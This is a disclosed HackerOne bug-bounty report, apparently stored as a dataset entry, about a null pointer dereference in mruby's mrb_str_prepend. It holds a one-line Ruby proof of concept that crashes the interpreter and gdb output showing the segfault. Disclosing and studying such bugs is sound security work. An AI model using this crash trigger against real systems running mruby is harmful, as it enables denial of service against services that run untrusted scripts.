---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '193081'
original_report_id: '193081'
title: Null pointer dereference in mrb_str_prepend
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2016-12-21T14:55:03.272Z'
disclosed_at: '2017-02-07T07:42:12.394Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Null pointer dereference in mrb_str_prepend

## Metadata

- HackerOne Report ID: 193081
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-02-07T07:42:12.394Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# PoC
```ruby
String.new.prepend("")
```

# Cause
This crash is caused by null dereference in
https://github.com/mruby/mruby/blob/master/mrbgems/mruby-string-ext/src/string.c#L474

# Test
```
$ gdb -q --args ./bin/mruby test4.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test4.rb

Program received signal SIGSEGV, Segmentation fault.
0x0000000000464553 in mrb_str_prepend (mrb=0x1538010, self=...) at /home/tunz/working/mruby/mruby/mrbgems/mruby-string-ext/src/string.c:474
474       RSTR_PTR(s1)[len] = '\0';
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
